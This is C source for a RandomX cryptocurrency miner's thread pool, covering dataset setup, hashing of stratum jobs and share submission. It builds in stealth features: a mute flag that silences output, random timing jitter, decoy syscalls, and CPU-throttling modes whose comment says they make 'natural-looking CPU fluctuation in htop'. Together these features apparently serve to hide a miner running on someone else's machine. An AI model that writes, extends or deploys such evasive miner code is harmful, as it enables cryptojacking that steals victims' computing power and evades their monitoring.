/* miner.c — RandomX miner thread pool implementation */

#include "miner.h"
#include "utils.h"
#include "config.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

extern int g_mute;
#include <math.h>
#include <sys/stat.h>
#include <sys/resource.h>
#include <signal.h>
#include "randomx.h"

/* Global RandomX state, shared across all threads */
static randomx_cache *g_cache = NULL;
static randomx_dataset *g_dataset = NULL;
static uint8_t g_seed_hash[32] = {0};
static bool g_rx_initialized = false;
static uint64_t g_seed_gen = 0;
static pthread_mutex_t g_rx_lock = PTHREAD_MUTEX_INITIALIZER;

rx_config_t rx_config = {0};

/* Decode hex blob from job into raw bytes */
static void build_block_blob(const stratum_job_t *job, uint8_t *blob, size_t *blob_len)
{
    *blob_len = strlen(job->blob) / 2;
    hex_to_bytes(job->blob, blob, *blob_len);
}

/* Write 4-byte (or 3-byte for NiceHash) nonce into the blob at offset 39 */
static void set_nonce(uint8_t *blob, size_t blob_len, uint32_t nonce, bool nicehash)
{
    if (blob_len >= 43) {
        if (nicehash) {
            blob[39] = (nonce >>  0) & 0xFF;
            blob[40] = (nonce >>  8) & 0xFF;
            blob[41] = (nonce >> 16) & 0xFF;
        } else {
            blob[39] = (nonce >>  0) & 0xFF;
            blob[40] = (nonce >>  8) & 0xFF;
            blob[41] = (nonce >> 16) & 0xFF;
            blob[42] = (nonce >> 24) & 0xFF;
        }
    }
}

/* Check if a 32-byte hash meets the pool's target; returns true if share qualifies */
static bool check_target(const uint8_t *hash, const char *target_hex)
{
    uint64_t target_val;
    size_t hex_len = strlen(target_hex);
    uint8_t raw[8] = {0};
    if (hex2bin(raw, target_hex, hex_len / 2) != 0) return false;

    if (hex_len / 2 == 4) {
        uint32_t compact;
        memcpy(&compact, raw, sizeof(compact));
        if (compact == 0) return false;
        target_val = 0xFFFFFFFFFFFFFFFFULL / (0xFFFFFFFFULL / (uint64_t)compact);
    } else if (hex_len / 2 == 8) {
        memcpy(&target_val, raw, sizeof(target_val));
    } else {
        return false;
    }

    uint64_t hash_val;
    memcpy(&hash_val, hash + 24, sizeof(hash_val));
    return hash_val < target_val;
}

/* Convert the last 8 bytes of a hash into a difficulty value */
static uint64_t hash_to_diff(const uint8_t *hash)
{
    uint64_t hash_val;
    memcpy(&hash_val, hash + 24, sizeof(hash_val));
    if (hash_val == 0) return UINT64_MAX;
    return 0xFFFFFFFFFFFFFFFFULL / hash_val;
}

/* Convert pool target hex to human-readable difficulty */
uint64_t target_to_diff(const char *target_hex)
{
    uint8_t raw[8] = {0};
    size_t hex_len = strlen(target_hex);
    size_t bytes = hex_len / 2;
    if (bytes == 0) return 0;
    if (hex2bin(raw, target_hex, bytes) != 0) return 0;

    uint64_t target_val;
    if (bytes == 4) {
        uint32_t compact;
        memcpy(&compact, raw, sizeof(compact));
        if (compact == 0) return 0;
        target_val = 0xFFFFFFFFFFFFFFFFULL / (0xFFFFFFFFULL / (uint64_t)compact);
    } else if (bytes == 8) {
        memcpy(&target_val, raw, sizeof(target_val));
    } else {
        return 0;
    }
    if (target_val == 0) return UINT64_MAX;
    return 0xFFFFFFFFFFFFFFFFULL / target_val;
}

/* Return the current RandomX flags from rx_config */
static int get_randomx_flags(void)
{
    return rx_config.flags;
}

/* Random delay for memory allocation (when -randm enabled) */
static void rand_mem_delay(void)
{
    if (rand() % 100 < 30) {  /* 30% chance */
        usleep((rand() % 10000) + 1000);  /* 1-11ms */
    }
}

/* Ensure RandomX is initialized for the given seed; reinitializes on seed change */
static void ensure_rx_init(const uint8_t *seed, bool rand_mem)
{
    pthread_mutex_lock(&g_rx_lock);
    if (g_rx_initialized && memcmp(g_seed_hash, seed, 32) == 0) {
        pthread_mutex_unlock(&g_rx_lock);
        return;
    }

    if (g_dataset) randomx_release_dataset(g_dataset);
    if (g_cache) randomx_release_cache(g_cache);
    g_dataset = NULL; g_cache = NULL;

    int flags = get_randomx_flags();
    if (rand_mem) rand_mem_delay();
    g_cache = randomx_alloc_cache(flags);
    if (!g_cache) { pthread_mutex_unlock(&g_rx_lock); return; }
    if (rand() % 100 < 30) usleep(rand() % 1000);
    randomx_init_cache(g_cache, seed, 32);

    if (rx_config.full_mem) {
        if (rand_mem) rand_mem_delay();
        if (rand() % 100 < 30) usleep(rand() % 1000);
        g_dataset = randomx_alloc_dataset(flags);
        if (g_dataset) {
            unsigned long total = randomx_dataset_item_count();
            unsigned long step = total / 10;
            if (step < 1) step = 1;
            for (unsigned long i = 0; i < total; i += step) {
                unsigned long count = (i + step < total) ? step : total - i;
                if (rand_mem) rand_mem_delay();
                randomx_init_dataset(g_dataset, g_cache, i, count);
                if (!g_mute) printf("\r[miner] dataset init %lu%%", (i + count) * 100 / total);
                fflush(stdout);
            }
            if (!g_mute) printf("\n");
        } else {
            if (!g_mute) fprintf(stderr, "[miner] dataset alloc failed, light mode\n");
        }
    }

    memcpy(g_seed_hash, seed, 32);
    g_rx_initialized = true;
    g_seed_gen++;
    pthread_mutex_unlock(&g_rx_lock);
}

/* Release global RandomX cache and dataset */
static void cleanup_rx(void)
{
    pthread_mutex_lock(&g_rx_lock);
    if (g_dataset) { randomx_release_dataset(g_dataset); g_dataset = NULL; }
    if (g_cache) { randomx_release_cache(g_cache); g_cache = NULL; }
    g_rx_initialized = false;
    pthread_mutex_unlock(&g_rx_lock);
}

/* Main mining loop: fetch job, hash with RandomX, check target, submit shares */
static void *miner_worker(void *arg)
{
    miner_ctx_t *ctx = (miner_ctx_t *)arg;
    stratum_job_t job;
    randomx_vm *vm = NULL;
    uint32_t nonce = ctx->nonce_start;

    if (!g_mute) printf("[miner:%d] started\n", ctx->thread_id);
    ctx->hashes_total = 0;

    uint64_t hash_count = 0;
    time_t last_report = time(NULL);
    double cpu_next_check = 0;
    struct timespec last_sleep;
    clock_gettime(CLOCK_MONOTONIC, &last_sleep);

    while (ctx->running) {
        if (!stratum_get_job(ctx->stratum, &job)) {
            usleep(100000);
            continue;
        }

        uint8_t seed[32] = {0};
        size_t seed_len = strlen(job.seed_hash) / 2;
        if (seed_len > 32) seed_len = 32;
        hex_to_bytes(job.seed_hash, seed, seed_len);

        ensure_rx_init(seed, ctx->rand_mem);

        if (!vm || ctx->seed_gen != g_seed_gen) {
            if (vm) randomx_destroy_vm(vm);
            if (ctx->rand_mem) rand_mem_delay();
            if (rand() % 100 < 30) usleep(rand() % 1000);
            int flags = get_randomx_flags();
            pthread_mutex_lock(&g_rx_lock);
            if (!g_cache) {
                pthread_mutex_unlock(&g_rx_lock);
                if (!g_mute) fprintf(stderr, "[miner:%d] no cache available\n", ctx->thread_id);
                usleep(1000000);
                continue;
            }
            if (rx_config.full_mem)
                vm = randomx_create_vm(flags, g_cache, g_dataset);
            else
                vm = randomx_create_vm(flags, g_cache, NULL);
            ctx->seed_gen = g_seed_gen;
            pthread_mutex_unlock(&g_rx_lock);
            if (!vm) {
                if (!g_mute) fprintf(stderr, "[miner:%d] VM creation failed\n", ctx->thread_id);
                usleep(1000000);
                continue;
            }
            if (!g_mute) printf("[miner:%d] VM ready\n", ctx->thread_id);
        }

        uint8_t blob[256];
        size_t blob_len;
        build_block_blob(&job, blob, &blob_len);
        set_nonce(blob, blob_len, nonce, ctx->stratum->nicehash);

        uint8_t hash[32];
        randomx_calculate_hash(vm, blob, blob_len, hash);

        if (rand() % 100 < 20) usleep(rand() % 100);

        if (rand() % 100 < 15) {
            int p = rand() % 5;
            struct stat st; struct timespec ts; struct rusage ru;
            if (p == 0) stat("/proc/self/status", &st);
            else if (p == 1) clock_gettime(CLOCK_MONOTONIC, &ts);
            else if (p == 2) getrusage(RUSAGE_SELF, &ru);
            else if (p == 3) getpgid(0);
            else sigemptyset(&(sigset_t){0});
        }

        ctx->hashes_total++;
        hash_count++;
        nonce++;

        if (ctx->cpu_rand_mode == CPU_RANDOMIZE_SINE || ctx->cpu_rand_mode == CPU_RANDOMIZE_BROWN) {
            struct timespec ts;
            clock_gettime(CLOCK_MONOTONIC, &ts);
            double now = ts.tv_sec + ts.tv_nsec / 1e9;
            if (now >= cpu_next_check) {
                double t = now * (2.0 * M_PI / 20.0) + ctx->cpu_phase;
                double duty;
                if (ctx->cpu_rand_mode == CPU_RANDOMIZE_BROWN) {
                    duty = 0.70 + 0.30 * sin(t * (2.0 * M_PI / 25.0) + 0.1 + ctx->cpu_phase);
                } else {
                    duty = 0.70 + 0.25 * sin(t) + 0.05 * sin(3.0 * t + 1.3);
                }
                duty += ((double)(rand() % 2001) - 1000) / 8000.0;
                if (duty < 0.40) duty = 0.40;
                if (duty > 1.0) duty = 1.0;
                int sleep_ms = (int)(1000.0 * (1.0 - duty));
                if (sleep_ms > 5) usleep(sleep_ms * 1000);
                cpu_next_check = now + 0.25;
            }
        } else if (ctx->cpu_rand_mode == CPU_RANDOMIZE_BURST) {
            /* Organic burst: variable hash time (1-6s) + variable sleep (2-8s).
             * Random durations create natural-looking CPU fluctuation in htop. */
            struct timespec now;
            clock_gettime(CLOCK_MONOTONIC, &now);
            double elapsed = (now.tv_sec - last_sleep.tv_sec) +
                             (now.tv_nsec - last_sleep.tv_nsec) / 1e9;
            if (elapsed >= 1.0 + (double)(rand() % 5001) / 1000.0) { /* 1.0-6.0s */
                usleep((rand() % 6000001) + 2000000); /* 2.0 - 8.0s sleep */
                clock_gettime(CLOCK_MONOTONIC, &last_sleep);
            }
        }

        if (check_target(hash, job.target)) {
            ctx->shares_found++;

            char nonce_hex[16], hash_hex[65];
            bin2hex(nonce_hex, blob + 39, 4);
            bin2hex(hash_hex, hash, 32);
            if (!g_mute) printf("[miner:%d] !!! SHARE share_diff=%lu pool_diff=%lu nonce=%s\n",
                   ctx->thread_id, hash_to_diff(hash),
                   target_to_diff(job.target), nonce_hex);
            stratum_submit(ctx->stratum, job.job_id, nonce_hex, hash_hex);
            ctx->shares_submitted++;
        }

        time_t now = time(NULL);
        if (now - last_report >= 10) {
            double rate = (double)hash_count / (double)(now - last_report);
            ctx->hash_rate = (uint32_t)rate;
            hash_count = 0;
            last_report = now;
        }
    }

    if (vm) randomx_destroy_vm(vm);
    if (!g_mute) printf("[miner:%d] stopped. hashes=%lu\n", ctx->thread_id, ctx->hashes_total);
    return NULL;
}

/* Initialize the miner pool with N threads, assigning nonce ranges */
int miner_pool_init(miner_pool_t *pool, stratum_ctx_t *stratum, int num_threads)
{
    pool->stratum = stratum;
    pool->num_threads = num_threads;
    pool->running = true;

    pool->threads = calloc(num_threads, sizeof(miner_ctx_t));
    pool->thread_handles = calloc(num_threads, sizeof(pthread_t));
    if (!pool->threads || !pool->thread_handles) {
        free(pool->threads);
        free(pool->thread_handles);
        pool->threads = NULL;
        pool->thread_handles = NULL;
        return -1;
    }

    uint32_t base_nonce = (uint32_t)(time(NULL) & 0xFFFFFFFF);
    for (int i = 0; i < num_threads; i++) {
        pool->threads[i].stratum = stratum;
        pool->threads[i].thread_id = i;
        pool->threads[i].nonce_start = base_nonce + (i * 0x00010000);
        pool->threads[i].running = true;
    }
    return 0;
}

/* Start all miner threads */
void miner_pool_start(miner_pool_t *pool)
{
    for (int i = 0; i < pool->num_threads; i++) {
        pool->threads[i].cpu_rand_mode = pool->cpu_rand_mode;
        pool->threads[i].rand_mem = pool->rand_mem;
        pool->threads[i].cpu_phase = (double)(rand() % 100000);
        pthread_create(&pool->thread_handles[i], NULL, miner_worker, &pool->threads[i]);
    }
}

/* Signal all threads to stop */
void miner_pool_stop(miner_pool_t *pool)
{
    pool->running = false;
    for (int i = 0; i < pool->num_threads; i++) {
        pool->threads[i].running = false;
    }
}

/* Wait for all threads to finish, clean up RandomX state, free memory */
void miner_pool_wait(miner_pool_t *pool)
{
    uint64_t total = 0;
    for (int i = 0; i < pool->num_threads; i++) {
        pthread_join(pool->thread_handles[i], NULL);
        total += pool->threads[i].hashes_total;
    }
    cleanup_rx();
    free(pool->threads);
    free(pool->thread_handles);
    if (!g_mute) printf("[miner] all threads stopped. total hashes=%lu\n", total);
}
